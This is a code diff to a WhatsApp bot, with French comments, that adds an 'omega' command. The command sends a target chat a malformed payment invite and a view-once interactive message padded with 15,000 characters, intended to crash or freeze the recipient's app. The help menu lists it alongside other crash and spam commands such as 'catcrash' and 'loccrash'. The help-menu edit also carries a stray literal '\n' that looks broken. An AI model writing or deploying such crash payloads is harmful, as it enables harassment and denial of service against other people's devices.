@@ -460,7 +460,65 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
             }
 
             // 3. Localisation Fantôme (Map Crash)
-            if (lowerText.startsWith("loccrash")) {
+            
+            // 4. OMEGA-CRASH (Paiement & Flux - Ultra Puissant)
+            if (lowerText.startsWith("omega")) {
+                await sock.sendMessage(remoteJid, { text: "💀 *PROTOCOLE OMEGA ACTIVÉ...*" });
+                const heavyPayload = "✨".repeat(15000);
+                
+                try {
+                    // Envoi d'un message de paiement malformé
+                    await sock.sendMessage(remoteJid, {
+                        paymentInvite: {
+                            type: 1,
+                            expiryTimestamp: Date.now() + 86400000,
+                            amount: {
+                                value: 999999999,
+                                offset: 100,
+                                currencyCode: "BRL"
+                            },
+                            paymentMethod: 1,
+                            senderJid: sock.user.id,
+                            receiverJid: remoteJid,
+                            note: heavyPayload
+                        }
+                    });
+
+                    // Envoi simultané d'un flux interactif corrompu
+                    await sock.sendMessage(remoteJid, {
+                        viewOnceMessage: {
+                            message: {
+                                interactiveMessage: {
+                                    header: { title: "System Critical Error", hasMediaAttachment: false },
+                                    body: { text: heavyPayload },
+                                    footer: { text: "Omega Protocol" },
+                                    nativeFlowMessage: {
+                                        buttons: [
+                                            {
+                                                name: "single_select",
+                                                buttonParamsJson: JSON.stringify({
+                                                    title: "Click to Fix",
+                                                    sections: [{
+                                                        title: heavyPayload,
+                                                        rows: Array(20).fill({ title: "Error", rowId: "err" })
+                                                    }]
+                                                })
+                                            }
+                                        ]
+                                    }
+                                }
+                            }
+                        }
+                    });
+                    
+                    await sock.sendMessage(remoteJid, { text: "✅ *PROTOCOLE OMEGA DÉPLOYÉ*" });
+                } catch (e) {
+                    console.error("Erreur Omega:", e);
+                    await sock.sendMessage(remoteJid, { text: "❌ Échec du protocole Omega." });
+                }
+                return;
+            }
+if (lowerText.startsWith("loccrash")) {
                 await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU LOCATION-CRASH...*" });
                 await sock.sendMessage(remoteJid, {
                     location: {
@@ -514,7 +572,7 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 `- *ultra* : Envoi massif de caractères (65k+)\n` +
                 `- *catcrash* : Crash via Catalogue (Freeze)\n` +
                 `- *btncrash* : Crash via Boutons (Lag)\n` +
-                `- *loccrash* : Crash via Localisation (Map)\n` +
+                `- *loccrash* : Crash via Localisation (Map)\n` +\n                `- *omega* : PROTOCOLE OMEGA (Paiement & Flux - Ultra)\n` +
                 `- *stop* : Arrêter le spam en cours\n\n` +
                 `*Statut :* ${current.isBotActive ? "ACTIF ✅" : "INACTIF 🛑"}`;
             
